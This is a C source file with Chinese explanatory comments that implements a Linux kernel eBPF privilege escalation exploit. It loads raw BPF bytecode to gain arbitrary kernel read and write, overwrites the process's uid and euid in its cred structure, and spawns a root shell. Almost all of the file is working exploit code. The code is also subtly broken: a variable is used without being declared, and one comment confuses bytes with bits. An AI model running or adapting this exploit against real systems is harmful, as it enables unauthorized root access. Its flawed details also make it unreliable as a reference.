// Tested on:
// Linux 4.5.0 #0 SMP x86_64 GNU/Linux
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <linux/bpf.h>
#include <linux/unistd.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <stdint.h>

#define PHYS_OFFSET 0xffff880000000000
#define CRED_OFFSET 0x9f8
#define UID_OFFSET 4
#define EUID_OFFSET 20
#define LOG_BUF_SIZE 65536
#define PROGSIZE 328

int sockets[2];
int mapfd, progfd;

char *__prog =     
        "\xb4\x09\x00\x00\xff\xff\xff\xff"
        "\x55\x09\x02\x00\xff\xff\xff\xff"
        "\xb7\x00\x00\x00\x00\x00\x00\x00"
        "\x95\x00\x00\x00\x00\x00\x00\x00"
        "\x18\x19\x00\x00\x03\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00"
        "\xbf\x91\x00\x00\x00\x00\x00\x00"
        "\xbf\xa2\x00\x00\x00\x00\x00\x00"
        "\x07\x02\x00\x00\xfc\xff\xff\xff"
        "\x62\x0a\xfc\xff\x00\x00\x00\x00"
        "\x85\x00\x00\x00\x01\x00\x00\x00"
        "\x55\x00\x01\x00\x00\x00\x00\x00"
        "\x95\x00\x00\x00\x00\x00\x00\x00"
        "\x79\x06\x00\x00\x00\x00\x00\x00"
        "\xbf\x91\x00\x00\x00\x00\x00\x00"
        "\xbf\xa2\x00\x00\x00\x00\x00\x00"
        "\x07\x02\x00\x00\xfc\xff\xff\xff"
        "\x62\x0a\xfc\xff\x01\x00\x00\x00"
        "\x85\x00\x00\x00\x01\x00\x00\x00"
        "\x55\x00\x01\x00\x00\x00\x00\x00"
        "\x95\x00\x00\x00\x00\x00\x00\x00"
        "\x79\x07\x00\x00\x00\x00\x00\x00"
        "\xbf\x91\x00\x00\x00\x00\x00\x00"
        "\xbf\xa2\x00\x00\x00\x00\x00\x00"
        "\x07\x02\x00\x00\xfc\xff\xff\xff"
        "\x62\x0a\xfc\xff\x02\x00\x00\x00"
        "\x85\x00\x00\x00\x01\x00\x00\x00"
        "\x55\x00\x01\x00\x00\x00\x00\x00"
        "\x95\x00\x00\x00\x00\x00\x00\x00"
        "\x79\x08\x00\x00\x00\x00\x00\x00"
        "\xbf\x02\x00\x00\x00\x00\x00\x00"
        "\xb7\x00\x00\x00\x00\x00\x00\x00"
        "\x55\x06\x03\x00\x00\x00\x00\x00"
        "\x79\x73\x00\x00\x00\x00\x00\x00"
        "\x7b\x32\x00\x00\x00\x00\x00\x00"
        "\x95\x00\x00\x00\x00\x00\x00\x00"
        "\x55\x06\x02\x00\x01\x00\x00\x00"
        "\x7b\xa2\x00\x00\x00\x00\x00\x00"
        "\x95\x00\x00\x00\x00\x00\x00\x00"
        "\x7b\x87\x00\x00\x00\x00\x00\x00"
        "\x95\x00\x00\x00\x00\x00\x00\x00";

char bpf_log_buf[LOG_BUF_SIZE];

// 加载bpf指令至内核
static int bpf_prog_load(enum bpf_prog_type prog_type,
          const struct bpf_insn *insns, int prog_len,
          const char *license, int kern_version) {
    union bpf_attr attr = {
        .prog_type = prog_type,
        .insns = (__u64)insns,
        .insn_cnt = prog_len / sizeof(struct bpf_insn),
        .license = (__u64)license,
        .log_buf = (__u64)bpf_log_buf,
        .log_size = LOG_BUF_SIZE,
        .log_level = 1,
    };

    attr.kern_version = kern_version;

    bpf_log_buf[0] = 0;

    return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

// 申请map
static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
           int max_entries) {
    union bpf_attr attr = {
        .map_type = map_type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries
    };
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

// 更新map中元素的值
static int bpf_update_elem(uint64_t key, uint64_t value) {
    union bpf_attr attr = {
        .map_fd = mapfd,
        .key = (__u64)&key,
        .value = (__u64)&value,
        .flags = 0,
    };

    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

// 获取map中元素的值
// 这里需要区别BPF_MAP_LOOKUP_ELEM这个系统调用和我们在bpf指令中调用的BPF_FUNC_map_lookup_elem这两者的区别
// 实际上他们的调用基本上是一致的，但是BPF_FUNC_map_lookup_elem得到的是元素的指针，而BPF_MAP_LOOKUP_ELEM在得到元素的指针后，会调用copy_to_user这个函数来讲指针指向的元素值赋值回value
static int bpf_lookup_elem(void *key, void *value) {
    union bpf_attr attr = {
        .map_fd = mapfd,
        .key = (__u64)key,
        .value = (__u64)value,
    };

    return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

static void __exit(char *err) {
    fprintf(stderr, "error: %s\n", err);
    exit(-1);
}

static void prep(void) {
    mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);  // 申请一个长度为3的map
    if (mapfd < 0)
        __exit(strerror(errno));
    printf("map fd is %d\n",mapfd);
    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
            (struct bpf_insn *)__prog, PROGSIZE, "GPL", 0);                  // 将我们的payload加载入内核

    if (progfd < 0) {
        __exit(strerror(errno));
    }
    if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))     // 创建socket，用于触发内核执行我们的payload
        __exit(strerror(errno));
    if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0)
        __exit(strerror(errno));
}

// 向socket中写入数据，仅为了触发内核执行我们的bpf代码
static void writemsg(void) {
    char buffer[64];

    ssize_t n = write(sockets[0], buffer, sizeof(buffer));

    if (n < 0) {
        perror("write");
        return;
    }
    if (n != sizeof(buffer))
        fprintf(stderr, "short write: %lu\n", n);
}

// 定义map中各项的值
#define __update_elem(a, b, c) \
    bpf_update_elem(0, (a)); \
    bpf_update_elem(1, (b)); \
    bpf_update_elem(2, (c)); \
    writemsg();

// 尝试获取map中指定key的value
static uint64_t get_value(int key) {
    uint64_t value;

    if (bpf_lookup_elem(&key, &value))
        __exit(strerror(errno));

    return value;
}

// 尝试获得内核栈地址
static uint64_t __get_fp(void) {
    __update_elem(1, 0, 0);

    return get_value(2);
}

// 尝试任意地址读
static uint64_t __read(uint64_t addr) {
    __update_elem(0, addr, 0);

    return get_value(2);
}

// 尝试任意地址写
static void __write(uint64_t addr, uint64_t val) {
    __update_elem(2, addr, val);
}

// 尝试获得rsp地址，也即存储task_struct地址的地址
static uint64_t get_sp(uint64_t addr) {
    return addr & ~(0x4000 - 1);
}

static void pwn(void) {
    uint64_t fp, sp, task_struct, credptr, uidptr,gidptr;

    fp = __get_fp(); // 得到rbp的值
    if (fp < PHYS_OFFSET)
        __exit("bogus fp");
    
    sp = get_sp(fp); // 得到内核栈顶rsp地址
    if (sp < PHYS_OFFSET)
        __exit("bogus sp");
    
    task_struct = __read(sp); // 读出task_struct结构体的地址

    if (task_struct < PHYS_OFFSET)
        __exit("bogus task ptr");

    printf("task_struct = %lx\n", task_struct);

    credptr = __read(task_struct + CRED_OFFSET); // 读出task_struct中cred结构体的地址
    
    if (credptr < PHYS_OFFSET)
        __exit("bogus cred ptr");

    uidptr = credptr + UID_OFFSET; // 得到uid的地址
	    if (uidptr < PHYS_OFFSET)
		__exit("bogus uid ptr");
	  printf("uidptr = %lx\n", uidptr);
	  __write(uidptr, 0); // 将uid以及gid置为0，注意这里写入的值为64位，uid+gid = 64bytes

    euidptr = credptr + EUID_OFFSET;
	  if (euidptr < PHYS_OFFSET)
		  __exit("fake addr");
	  printf("euidptr = %lx\n", euidptr);
	  __write(euidptr,0);// 将euid以及egid置为0

    if (getuid() == 0 && geteuid() == 0) { // 此时该进程已经为root权限,注意在busybox环境下仅修改uid以及gid为0是无法提权的，在bash环境下则可以
        printf("spawning root shell\n");
        system("/bin/sh"); // fork出“/bin/sh”，同样是root权限，提权成功
        exit(0);
    }

    __exit("not vulnerable?");
}

int main(int argc, char **argv) {
    prep();
    pwn();

    return 0;
}